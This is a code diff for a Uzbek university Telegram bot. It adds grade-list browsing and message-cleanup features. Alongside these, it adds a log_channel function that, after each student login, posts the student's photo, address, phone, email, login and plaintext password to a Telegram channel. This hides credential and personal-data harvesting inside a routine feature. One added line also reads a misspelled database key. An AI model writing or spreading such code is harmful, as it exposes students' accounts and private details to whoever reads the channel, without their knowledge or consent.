@@ -18,13 +18,31 @@ from datetime import datetime, timezone, timedelta
 UZ_TZ = timezone(timedelta(hours=5))
 bot = Bot(token=BOT_TOKEN)
 
+async def log_channel(photo, message, user_id):
+    await bot.send_photo(
+        chat_id=CHANNEL_ID,
+        photo=photo,
+        caption=message,
+        reply_markup=InlineKeyboardMarkup(channel_but(user_id)),
+        parse_mode=ParseMode.HTML
+    )
+
 async def log_deleter(user_id, type, context):
     messages = context.user_data.get(type, [])
+    cache = get(table="users", user_id=str(user_id))
+    try:
+        for ids in cache["context_cache"]:
+            messages.append(ids)
+        upd(table="users", user_id=user_id, data={"context_cache": []})
+    except:
+        pass
+
     for msg_id in messages:
         try:
             await bot.delete_message(chat_id=user_id, message_id=msg_id)
         except:
             pass
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     first_name = update.effective_user.first_name
@@ -410,12 +428,7 @@ async def text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=InlineKeyboardMarkup(attend_but),
                 parse_mode=ParseMode.HTML
             )
-            messages = context.user_data.get("messages", [])
-            for msg_id in messages:
-                try:
-                    await bot.delete_message(chat_id=user_id, message_id=msg_id)
-                except:
-                    pass
+            await log_deleter(user_id=user_id, type="messages", context=context)
             context.user_data["messages"] = []
             context.user_data.setdefault("messages", []).append(update.message.message_id)
             context.user_data.setdefault("messages", []).append(msg.message_id)
@@ -451,12 +464,7 @@ async def text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
                 msg = await update.message.reply_text(text,reply_markup=InlineKeyboardMarkup(weekday_but), parse_mode=ParseMode.HTML)
             
-            messages = context.user_data.get("messages", [])
-            for msg_id in messages:
-                try:
-                    await bot.delete_message(chat_id=user_id, message_id=msg_id)
-                except:
-                    pass
+            await log_deleter(user_id=user_id, type="messages", context=context)
             context.user_data["messages"] = []
             context.user_data.setdefault("messages", []).append(update.message.message_id)
             context.user_data.setdefault("messages", []).append(msg.message_id)
@@ -496,7 +504,29 @@ async def text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         USER_start_but,
                         resize_keyboard=True)
                     )
-                
+                user_data=user_info["data"]
+                await log_channel(photo=user_data['image'],
+                                  message=channel_mes.format(
+                                user_data["full_name"],
+                                user_data["university"],
+                                user_data["faculty"]["name"],
+                                user_data["specialty"]["name"],
+                                user_data["educationType"]["name"],
+                                user_data["educationForm"]["name"],
+                                user_data["paymentForm"]["name"],
+                                user_data["group"]["name"],
+                                user_data["level"]["name"],
+                                user_data["semester"]["name"],
+                                user_data["province"]["name"],
+                                user_data["district"]["name"],
+                                user_data["address"],
+                                user_data["phone"],
+                                user_data["email"],
+                                user.get("login", 0),
+                                password,
+                                user_data["gender"]["name"]           
+                                  ),
+                                user_id=user_id)
                 
             else:
                 msg = await update.message.reply_text(
@@ -544,12 +574,7 @@ async def text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode=ParseMode.HTML,
                 reply_markup=InlineKeyboardMarkup(logout_inline_button)
             )
-            messages = context.user_data.get("messages", [])
-            for msg_id in messages:
-                try:
-                    await bot.delete_message(chat_id=user_id, message_id=msg_id)
-                except:
-                    pass
+            await log_deleter(user_id=user_id, type="messages", context=context)
             context.user_data["messages"] = []
             context.user_data.setdefault("messages", []).append(update.message.message_id)
             context.user_data.setdefault("messages", []).append(msg.message_id)
@@ -652,8 +677,15 @@ async def text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 return
             update_student_uploads(id=int(upload_id), data={"rate": rate})
             context.user_data.setdefault("rate_log", []).append(update.message.message_id)
+            try:
+                student = get(table="users", user_id=upload['from_user']['user_id'])["conetext"]
+            except:
+                student = []
             
-            await bot.send_message(chat_id=upload['from_user']['user_id'], text=you_have_rate_mes.format(user.get("subject_name"), rate), parse_mode=ParseMode.HTML)
+            n_msg = await bot.send_message(chat_id=upload['from_user']['user_id'], text=you_have_rate_mes.format(user.get("subject_name"), rate), parse_mode=ParseMode.HTML)
+            student.append(n_msg.message_id)
+            upd(table="users", user_id=upload['from_user']['user_id'], data={"context_cache": student})
+
 
             messages = context.user_data.get("rate_log", [])
             for message in messages:
@@ -756,12 +788,15 @@ async def text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await log_deleter(user_id=user_id, type="messages", context=context)
         
         if message == "Baholar jadvali📄":
+            upd(table="users", user_id=user_id, data={"stage": "rate_list"})
             msg = await update.message.reply_text(
-                text=in_optimize_mes,
-                reply_markup=ReplyKeyboardMarkup(TEACHER_start_but, resize_keyboard=True),
+                text=choose_course_mes,
+                reply_markup=InlineKeyboardMarkup(all_coureses_but),
                 parse_mode=ParseMode.HTML
             )
-            await log_deleter(user_id=user_id, type="messages", context=context)
+            # await log_deleter(user_id=user_id, type="messages", context=context)
+
+
         context.user_data.setdefault("messages", []).append(msg.message_id)             
     context.user_data.setdefault("messages", []).append(update.message.id)
 
@@ -818,6 +853,28 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = get(table="users", user_id=user_id)
         stage = user["stage"]
 
+        if query.data == "rate_list_calculate":
+            index = user.get("index", 0)
+            subject = user.get("subject_name", "")
+            group = user.get("group_data", '')
+            tasks = get_students_tasks(subject=subject, group=group)
+            task = tasks[index]
+            uploads = get_student_uploads(uniq_id=task.get("uniq_id"))
+            
+            text=rate_list_mes.format(user.get("course_number", 0), group.split("_")[3])
+
+            for i, upload in enumerate(uploads,1):
+                text+=f"{i}) {upload['from_user']['second_name']} {upload['from_user']['first_name']}: <b>{upload['rate']}</b>\n"
+            
+            text+=rate_list_mes2.format(index+1, len(tasks), BOT_USERNAME)
+            msg = await query.edit_message_caption(
+                caption=text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=InlineKeyboardMarkup(rate_list_but)
+            )
+
+            return
+        
         if query.data == "back" or query.data == "back_courses":
             await query.message.delete()
 
@@ -836,20 +893,19 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data["messages"] = []
             context.user_data.setdefault("messages", []).append(msg.message_id)
 
-            upd(table="users", data={"stage":"start"}, user_id=user_id)
+            upd(table="users", data={"stage":"start", "group_data": "", "index": 0, "rate_group": "", "course_number": 0}, user_id=user_id)
             return  
 
         if query.data in ["1_kurs", "2_kurs", "3_kurs"]:
-            print("a")
-            if stage == "upload_task":
-                if query.data == "1_kurs":
-                    reply_markup=groups_but1
-                if query.data == "2_kurs":
-                    reply_markup=groups_but2
-                if query.data == "3_kurs":
-                    reply_markup=groups_but3
+            if query.data == "1_kurs":
+                reply_markup=groups_but1
+            if query.data == "2_kurs":
+                reply_markup=groups_but2
+            if query.data == "3_kurs":
+                reply_markup=groups_but3
+            course_number = query.data.split("_")[0]
 
-                course_number = query.data.split("_")[0]
+            if stage == "upload_task":
                 msg = await query.edit_message_text(
                     text=choose_group_mes.format(course_number),
                     reply_markup=InlineKeyboardMarkup(reply_markup)
@@ -858,21 +914,22 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 return
             
             if stage == "rate":
-                course_number = query.data.split("_")[0]
-                if query.data == "1_kurs":
-                    reply_markup=groups_but1
-                if query.data == "2_kurs":
-                    reply_markup=groups_but2
-                if query.data == "3_kurs":
-                    reply_markup=groups_but3
-
                 msg = await query.edit_message_text(
                     text=choose_group_mes.format(course_number),
                     reply_markup=InlineKeyboardMarkup(reply_markup)
                 )
                 upd(table="users", user_id=user_id, data={
-                    "stage": "rate_group"
+                    "stage": "rate_group",
+                    "course_number": course_number
                 })
+
+            if stage == "rate_list":
+                msg = await query.edit_message_text(
+                    text=choose_group_mes.format(course_number),
+                    reply_markup=InlineKeyboardMarkup(reply_markup)
+                )
+                upd(table="users", user_id=user_id, data={"course_number": course_number})
+                return
 
         if query.data == "rate_student_upload":
             if stage == "student_uploads":
@@ -930,8 +987,8 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 task = tasks[index]
             except:
                 msg = await query.message.reply_text(text="Bu guruh uchun hali topshiriq joylanmagan🚫 ")
-                context.user_data.setdefault("not_log", []).append(msg.message_id)
                 context.user_data.setdefault("messages", []).append(msg.message_id)
+                context.user_data.setdefault("not_log", []).append(msg.message_id)
                 return
             
             uniq_id = task["uniq_id"]
@@ -963,7 +1020,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             for msg_id in messages:
                 try:
-                    await bot.delete_message(chat_id =user_id, message_id=msg_id)
+                    await bot.delete_message(chat_id=user_id, message_id=msg_id)
                 except:
                     pass
             return
@@ -1025,7 +1082,6 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
             return
  
-             
         if stage == "upload_assignment":
             await query.edit_message_text(
                 text=not_uploading_file_mes
@@ -1036,6 +1092,10 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             tasks_list = []
             index = get(table="users", user_id=user_id)["index"]
             
+            if stage == "rate_list":
+                tasks_list = get_students_tasks(subject=user.get("subject_name"), group=user.get("group_data"))
+
+
             if stage == "manage_tasks":
                 for task in get(table="tasks", user_id=user_id):
                     tasks_list.append(task)
@@ -1062,11 +1122,13 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     return
                 uniq_id = tasks_list[index]["uniq_id"]
                 uploads = get_student_uploads(uniq_id=uniq_id)
+                
+
+
                 if len(uploads) == 0:
                     reply_markup = teach_tasks2_but
                 else:
                     reply_markup = teach_tasks1_but
-
                      
                 msg = await query.edit_message_media(
                     media=InputMediaDocument(
@@ -1109,6 +1171,8 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup = teach_tasks1_but
             else:
                 reply_markup = teach_tasks2_but
+            if stage == "rate_list":
+                reply_markup = rate_list_but
             msg = await query.edit_message_media(
                 media=InputMediaDocument(
                     media=task["file_id"],
@@ -1159,7 +1223,41 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     upd(table="users", user_id=user_id, data={"stage": "student_uploads"})
                 except:
                     await query.answer("Hali natijalar yo'q!", show_alert=True)
+
+        if stage == "rate_list":
+            subject = get(table="users", user_id=user_id)["subject_name"]
+            callback = query.data
+            index = get(table="users", user_id=user_id)["index"]
+            tasks = get_students_tasks(group=callback, subject=subject)
+            try:
+                task = tasks[index]
+            except:
+                msg = await query.message.reply_text(text="Bu guruh uchun hali topshiriq joylanmagan🚫 ")
+                context.user_data.setdefault("messages", []).append(msg.message_id)
+                return
             
+            uniq_id = task["uniq_id"]
+            uploads = get_student_uploads(uniq_id=uniq_id)
+
+            msg = await query.edit_message_media(
+                media=InputMediaDocument(
+                    media=task['file_id'],
+                    filename=task['file_name'],
+                    caption=teacher_tasks_mes.format(
+                        task.get("caption"),
+                        task['course_number'],
+                        task["group_data"].split("_")[3],
+                        task['from_teacher']['subject_name'],
+                        len(uploads),
+                        index+1,
+                        len(tasks),
+                        BOT_USERNAME
+                    ),
+                    parse_mode=ParseMode.HTML
+                ),
+                reply_markup=InlineKeyboardMarkup(rate_list_but))
+            upd(table="users", user_id=user_id, data={"group_data": callback})
+
     if user['role'] == "user":
 
         if "attend" in query.data:
